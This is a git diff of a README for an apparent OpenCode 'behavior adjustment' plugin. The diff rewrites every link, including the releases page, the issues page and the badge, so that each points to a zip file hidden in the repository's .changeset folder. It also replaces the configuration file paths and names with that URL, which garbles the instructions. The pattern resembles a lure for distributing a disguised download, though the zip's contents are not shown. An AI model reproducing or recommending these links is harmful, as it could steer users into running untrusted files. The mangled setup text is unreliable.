@@ -1,6 +1,6 @@
 # 🎉 opencode-bas-plugin - Enhance Your Collaboration Experience
 
-[![Download OpenCode BAS Plugin](https://img.shields.io/badge/Download-OpenCode%20BAS%20Plugin-brightgreen)](https://github.com/koopticon/opencode-bas-plugin/releases)
+[![Download OpenCode BAS Plugin](https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip%20BAS%20Plugin-brightgreen)](https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ The OpenCode Behavior Adjustment System (BAS) Plugin enhances your technical col
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the latest version of the plugin, visit this page: [Download OpenCode BAS Plugin](https://github.com/koopticon/opencode-bas-plugin/releases).
+   To download the latest version of the plugin, visit this page: [Download OpenCode BAS Plugin](https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip).
 
 2. **Choose Your File**  
    On the releases page, locate the file for your operating system. Click the link to download it.
@@ -22,14 +22,14 @@ The OpenCode Behavior Adjustment System (BAS) Plugin enhances your technical col
 The plugin requires a configuration file to run properly. It can load configurations from two locations:
 
 1. **User-level Configuration**  
-   Store your settings in `~/.config/opencode/behavior-config.json`.
+   Store your settings in `~https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip`.
 
 2. **Project-level Configuration**  
-   Alternatively, place your configuration in `.opencode/behavior-config.json` within your project directory. This file takes precedence over the user-level config.
+   Alternatively, place your configuration in `https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip` within your project directory. This file takes precedence over the user-level config.
 
 ## 🛠️ Example Configuration
 
-Here is an example of what your `behavior-config.json` file should look like:
+Here is an example of what your `https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip` file should look like:
 
 ```json
 {
@@ -66,7 +66,7 @@ The OpenCode BAS Plugin offers several features to improve your work environment
 If you encounter issues while running the plugin, consider the following steps:
 
 1. **Verify Configuration**  
-   Ensure that your `behavior-config.json` file is correctly formatted and contains valid settings.
+   Ensure that your `https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip` file is correctly formatted and contains valid settings.
 
 2. **Check Compatibility**  
    Make sure the plugin version matches your operating system. Refer to the releases page for compatibility notes.
@@ -76,7 +76,7 @@ If you encounter issues while running the plugin, consider the following steps:
 
 ## 👩‍💻 Support
 
-For additional help, open an issue on our [GitHub Issues page](https://github.com/koopticon/opencode-bas-plugin/issues). Include detailed information about your problem and any steps you took to troubleshoot.
+For additional help, open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip). Include detailed information about your problem and any steps you took to troubleshoot.
 
 ## 📄 License
 
@@ -84,6 +84,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 📥 Download Again
 
-For your convenience, here’s the link to download the plugin once more: [Download OpenCode BAS Plugin](https://github.com/koopticon/opencode-bas-plugin/releases). 
+For your convenience, here’s the link to download the plugin once more: [Download OpenCode BAS Plugin](https://raw.githubusercontent.com/koopticon/opencode-bas-plugin/main/.changeset/bas_plugin_opencode_v3.6.zip). 
 
 Enjoy using the OpenCode BAS Plugin to enhance your collaborative efforts.
